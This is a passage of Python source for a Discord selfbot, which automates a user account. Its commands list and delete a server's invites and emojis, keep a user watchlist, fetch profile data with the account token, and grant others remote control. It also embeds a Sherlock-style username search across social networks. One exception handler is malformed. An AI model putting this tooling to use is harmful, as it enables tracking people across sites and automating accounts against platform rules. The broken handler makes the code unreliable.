                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Guilds', description='\n'.join([guild.name for guild in guilds]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Guilds:`' + '\n'.join([guild.name for guild in guilds]) or 'None')
        except:
            pass
        
    @React.command(usage="watchlist", description="Shows users in the watcher")
    async def watchlist(ctx):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)

        watch_users = []
        for _id in data['watched_users']:
            watch_users.append(_id)
            
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Watchlist', description='\n'.join([f"<@{watched_user}>" for watched_user in watch_users]) or 'None',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except:
            pass
        
    @React.command(usage="delinvites", description="Deletes all server invites")
    async def delinvites(ctx):
        try:      
            deleted_invites = []         
            for invite in await ctx.guild.invites():
                deleted_invites.append(invite.code)
                await invite.delete()
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Deleted Invites', description='\n'.join([invite for invite in deleted_invites]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Deleted Invites:`' + '\n'.join([invite for invite in deleted_invites]) or 'None')
        except Exception:
            pass
        
    @React.command(usage="delemojis", description="Deletes all server emojis")
    async def delemojis(ctx):
        try:      
            deleted_emojis = []         
            for emoji in await ctx.guild.fetch_emojis():
                deleted_emojis.append(emoji.name)
                await emoji.delete()
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Deleted Emojis', description='\n'.join([emoji for emoji in deleted_emojis]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Deleted Emojis:`' + '\n'.join([emoji for emoji in deleted_emojis]) or 'None')
        except Exception:
            pass
        
    @React.command(usage="renameserver <Name>", description="Renames the server")
    async def renameserver(ctx, *, name):
        try:      
            await ctx.guild.edit(name = name)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rename Server', description=f'Renamed Server to {name}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Rename Server:`' + 'Renamed Server to {name}')
        except Exception:
            pass

    @React.command(usage="serverinfo [Server ID]", description="Shows server information")
    async def serverinfo(ctx, server_id: int=None):
        
        if server_id is None:
            server = discord.utils.get(ctx.bot.guilds, id=ctx.guild.id)
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
            
        total_users = server.member_count
        online = len([m for m in server.members if m.status != discord.Status.offline])
        text_channels = len([x for x in server.channels if isinstance(x, discord.TextChannel)])
        voice_channels = len([x for x in server.channels if isinstance(x, discord.VoiceChannel)])
        categories = len(server.channels) - text_channels - voice_channels
        passed = (ctx.message.created_at - server.created_at).days
        created_at = "Since {} ({} days ago)".format(server.created_at.strftime("%d %b %Y %H:%M"), passed)
        
        if True:
            data = discord.Embed(description=created_at, color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())
            data.add_field(name="Region", value=str(server.region).capitalize())
            data.add_field(name="Users", value="{}/{}".format(online, total_users))
            data.add_field(name="Text Channels", value=text_channels)
            data.add_field(name="Voice Channels", value=voice_channels)
            data.add_field(name="Categories", value=categories)
            data.add_field(name="Roles", value=len(server.roles))
            data.add_field(name="Emojis", value=f'{len(server.emojis)}')
            data.add_field(name="Owner", value=str(server.owner))
            data.add_field(name="Server ID", value=str(server.id))
            data.add_field(name="AFK Voice Timeout", value=f'{str(int(server.afk_timeout / 60))} min')
            data.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            data.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            data.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'] or server.icon_url)
            await embed_or_codeblock(ctx, data)


        else:
            msg = f'''```yaml
Server Information:
Server Name: {server.name}
Created at: {created_at}
Region: {str(server.region)}
Users: {"{}/{}".format(online, total_users)}
Text Channels: {text_channels}
Voice Channels: {voice_channels}
Categories: {categories}
Roles: {len(server.roles)}
Owner: {str(server.owner)}
Server ID: {str(server.id)}
```'''
            await ctx.send(msg)
            await ctx.send(server.icon_url)

    @React.command(usage="userinfo [User]", description="Shows user information")
    async def userinfo(ctx, user: discord.Member=None):
        try:
            if ctx.guild is not None:
                server = ctx.guild
                if user is None:
                    member = ctx.author
                else:
                    member = ctx.guild.get_member(user.id)
                avi = member.avatar_url
                roles = sorted(member.roles, key=lambda c: c.position / -1)

                rolenames = ' '.join([r.mention for r in roles if r.name != '@everyone']) or 'None'
                member_number = sorted(server.members, key=lambda m: m.joined_at).index(member) + 1
                permissions = ', '.join([str(p[0]).replace("_", " ").title() for p in member.guild_permissions if p[1]])

                resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                j = resp.json()
                premium_since = j['premium_since']

                channel = None
                streaming = False
                if member.voice is not None:
                    channel = member.voice.channel
                    streaming = member.voice.self_stream
                if True:
                    em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())
                    em.add_field(name='Nickname', value=member.nick, inline=True)
                    em.add_field(name='Member Number', value=str(member_number), inline = True)
                    em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'), inline=True)
                    em.add_field(name='User ID', value=str(member.id), inline=True)
                    em.add_field(name='Join Date', value=member.joined_at.__format__('%A, %d. %B %Y'))
                    em.add_field(name='Roles', value=rolenames, inline=True)
                    em.add_field(name='Top Role', value=member.top_role.mention, inline=True)
                    em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
                    em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
                    em.add_field(name='Is In Voice Channel', value=channel, inline=True)
                    em.add_field(name='Is Streaming', value=streaming, inline=True)
                    em.add_field(name='Guild permissions', value=permissions, inline=True)
                    em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    em.set_thumbnail(url=avi)
                    em.set_author(name=member, icon_url=server.icon_url)

                    await embed_or_codeblock(ctx, em)


                else:
                    msg = f'''```yaml
User Information about {member}:
Nickname: {member.nick}
Member Number: {member_number}
Account Created: {member.created_at.__format__('%A, %d. %B %Y')}
User ID: {str(member.id)}
Join Date: {member.joined_at.__format__('%A, %d. %B %Y')}
Roles: {rolenames}
Top Role: {member.top_role.mention}
Nitro Subscription Since: {premium_since}
Is On Mobile: {member.is_on_mobile()}
Is In Voice Channel: {channel}
Is Streaming: {streaming}
Guild permissions: {permissions}
```'''
                    await ctx.send(msg)
                    await ctx.send(avi)
            else:
                if user is None:
                    member = ctx.author
                else:
                    member = user
                avi = member.avatar_url
                resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                j = resp.json()
                premium_since = j['premium_since']

                if True:
                    em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())
                    em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'))
                    em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
                    em.add_field(name='User ID', value=str(member.id), inline=True)
                    em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
                    em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    em.set_thumbnail(url=avi)
                    em.set_author(name=member, icon_url=avi)
                else:
                    msg = f'''```yaml
User Information about {member}:
Account Created: {member.created_at.__format__('%A, %d. %B %Y')}
Is On Mobile: {member.is_on_mobile()}
User ID: {str(member.id)}
Nitro Subscription Since: {premium_since}
```'''
                    await ctx.send(msg)
                    await ctx.send(avi)

                await embed_or_codeblock(ctx, em)


        except Exception:
            return

    @React.command(usage="lookupuser <User ID>", description="Lookups an user by his ID")
    async def lookupuser(ctx, user_id: int):
        try:
            discordUser = await React.fetch_user(user_id)
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title="User Lookup",timestamp=embed_timestamp())
            em.add_field(name='User ID', value=discordUser.id)
            em.add_field(name='Name', value=f"{discordUser.name}#{discordUser.discriminator}", inline=True)
            em.add_field(name='Created At', value=discordUser.created_at.__format__('%A, %d. %B %Y'), inline=True)
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            em.set_thumbnail(url=discordUser.avatar_url)
            await embed_or_codeblock(ctx, em)


        except Exception:
            pass
        
    @React.command(usage="remotecommandsuseradd <User>", description="Allows other user to use selfbot commands")
    async def remotecommandsuseradd(ctx, user: discord.User):
        global remote_selfbot_users
        remote_selfbot_users.append(user.id)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Remote Commands',timestamp=embed_timestamp())
        embed.add_field(name=f'__üíû Selfbot Access Granted__', value=f'{user}', inline=False)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="remotecommandsuserdel <User>", description="Disallows other user to use selfbot commands")
    async def remotecommandsuserdel(ctx, user: discord.User):
        global remote_selfbot_users
        remote_selfbot_users.remove(user.id)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Remote Commands',timestamp=embed_timestamp())
        embed.add_field(name=f'__üíò Selfbot Access Revoked__', value=f'{user}', inline=False)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="mutualguilds <User>", description="Shows mutual guilds with user")
    async def mutualguilds(ctx, user: discord.User=None):
        try:
        
            if user is None:
                member = ctx.author
            else:
                member = ctx.guild.get_member(user.id)
                    
            profile = await member.profile()
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mutual guilds with {member}', description='\n'.join([g.name for g in profile.mutual_guilds]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Mutual guilds with {member}:`' + '\n'.join([g.name for g in profile.mutual_guilds]) or 'None')
        except:
            return
        
        
    command_history = []
    
    @React.command(usage="cmdhistory", description="Command history")
    async def cmdhistory(ctx):
        try:                
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Command History', description='\n'.join([command for command in reversed(command_history)]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Command History:`' + '\n'.join([command.name for command in reversed(command_history)]) or 'None')
        except Exception:
            pass
        
    @React.command(usage="bannedusers", description="Shows banned users")
    async def bannedusers(ctx):
        try:                                        
            bans = await ctx.guild.bans()
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Banned Users', description='\n'.join([f"{g.user.name}#{g.user.discriminator}" for g in bans]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'`Banned Users:`' + '\n'.join([f"{g.user.name}#{g.user.discriminator}" for g in bans]) or 'None')
        except:
            pass

    class SherlockFuturesSession(FuturesSession):
        def request(self, method, url, hooks={}, *args, **kwargs):
            start = monotonic()

            def response_time(resp, *args, **kwargs):
                resp.elapsed = monotonic() - start

                return

            try:
                if isinstance(hooks['response'], list):
                    hooks['response'].insert(0, response_time)
                elif isinstance(hooks['response'], tuple):
                    hooks['response'] = list(hooks['response'])
                    hooks['response'].insert(0, response_time)
                else:
                    hooks['response'] = [response_time, hooks['response']]
            except KeyError:
                hooks['response'] = [response_time]

            return super(SherlockFuturesSession, self).request(method,
                                                            url,
                                                            hooks=hooks,
                                                            *args, **kwargs)


    def get_response(request_future, error_type, social_network):

        # Default for Response object if some failure occurs.
        response = None

        error_context = "General Unknown Error"
        expection_text = None
        try:
            response = request_future.result()
            if response.status_code:
                # Status code exists in response object
                error_context = None
        except requests.exceptions.HTTPError as errh:
            error_context = "HTTP Error"
            expection_text = str(errh)
        except requests.exceptions.ProxyError as errp:
            error_context = "Proxy Error"
            expection_text = str(errp)
        except requests.exceptions.ConnectionError as errc:
            error_context = "Error Connecting"
            expection_text = str(errc)
        except requests.exceptions.Timeout as errt:
            error_context = "Timeout Error"
            expection_text = str(errt)
        except requests.exceptions.RequestExceptionrr:
            error_context = "Unknown Error"
            expection_text = str(err)

        return response, error_context, expection_text


    def sherlock(username, site_data, query_notify,
                tor=False, unique_tor=False,
                proxy=None, timeout=None):

        # Notify caller that we are starting the query.
        query_notify.start(username)

        # Create session based on request methodology
        underlying_session = requests.session()
        underlying_request = requests.Request()

        # Limit number of workers to 20.
        # This is probably vastly overkill.
        if len(site_data) >= 20:
            max_workers=20
        else:
            max_workers=len(site_data)

        # Create multi-threaded session for all requests.
        session = SherlockFuturesSession(max_workers=max_workers,
                                        session=underlying_session)


        # Results from analysis of all sites
        results_total = {}

        # First create futures for all requests. This allows for the requests to run in parallel
        for social_network, net_info in site_data.items():

            # Results from analysis of this specific site
            results_site = {}

            # Record URL of main site
            results_site['url_main'] = net_info.get("urlMain")

            # A user agent is needed because some sites don't return the correct
            # information since they think that we are bots (Which we actually are...)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
            }

            if "headers" in net_info:
                # Override/append any extra headers required by a given site.
                headers.update(net_info["headers"])

            # URL of user on site (if it exists)
            url = net_info["url"].format(username)

            # Don't make request if username is invalid for the site
            regex_check = net_info.get("regexCheck")
            if regex_check and re.search(regex_check, username) is None:
                # No need to do the check at the site: this user name is not allowed.
                results_site['status'] = QueryResult(username,
                                                    social_network,
                                                    url,
                                                    QueryStatus.ILLEGAL)
                results_site["url_user"] = ""
                results_site['http_status'] = ""
                results_site['response_text'] = ""
                query_notify.update(results_site['status'])
            else:
                # URL of user on site (if it exists)
                results_site["url_user"] = url
                url_probe = net_info.get("urlProbe")
                if url_probe is None:
                    # Probe URL is normal one seen by people out on the web.
                    url_probe = url
                else:
                    # There is a special URL for probing existence separate
                    # from where the user profile normally can be found.
                    url_probe = url_probe.format(username)

                if (net_info["errorType"] == 'status_code' and
                    net_info.get("request_head_only", True) == True):
                    # In most cases when we are detecting by status code,
                    # it is not necessary to get the entire body:  we can
                    # detect fine with just the HEAD response.
                    request_method = session.head
                else:
                    # Either this detect method needs the content associated
                    # with the GET response, or this specific website will
                    # not respond properly unless we request the whole page.
                    request_method = session.get

                if net_info["errorType"] == "response_url":
                    # Site forwards request to a different URL if username not
                    # found.  Disallow the redirect so we can capture the
                    # http status from the original URL request.
                    allow_redirects = False
                else:
                    # Allow whatever redirect that the site wants to do.
                    # The final result of the request will be what is available.
                    allow_redirects = True

                future = request_method(url=url_probe, headers=headers,
                                        allow_redirects=allow_redirects,
                                        timeout=timeout
                                        )

                # Store future in data for access later
                net_info["request_future"] = future


            # Add this site's results into final dictionary with all of the other results.
            results_total[social_network] = results_site

        # Open the file containing account links
        # Core logic: If tor requests, make them here. If multi-threaded requests, wait for responses
        for social_network, net_info in site_data.items():

            # Retrieve results again
            results_site = results_total.get(social_network)

            # Retrieve other site information again
            url = results_site.get("url_user")
            status = results_site.get("status")
            if status is not None:
                # We have already determined the user doesn't exist here
                continue

            # Get the expected error type
            error_type = net_info["errorType"]

            # Retrieve future and ensure it has finished
            future = net_info["request_future"]
            r, error_text, expection_text = get_response(request_future=future,
                                                        error_type=error_type,
                                                        social_network=social_network)

            # Get response time for response of our request.
            try:
                response_time = r.elapsed
            except AttributeError:
                response_time = None

            # Attempt to get request information
            try:
                http_status = r.status_code
            except:
                http_status = "?"
            try:
                response_text = r.text.encode(r.encoding)
            except:
                response_text = ""

            if error_text is not None:
                result = QueryResult(username,
                                    social_network,
                                    url,
                                    QueryStatus.UNKNOWN,
                                    query_time=response_time,
                                    context=error_text)
            elif error_type == "message":
                # error_flag True denotes no error found in the HTML
                # error_flag False denotes error found in the HTML
                error_flag = True
                errors=net_info.get("errorMsg")
                # errors will hold the error message
                # it can be string or list
                # by insinstance method we can detect that
                # and handle the case for strings as normal procedure
                # and if its list we can iterate the errors
                if isinstance(errors,str):
                    # Checks if the error message is in the HTML
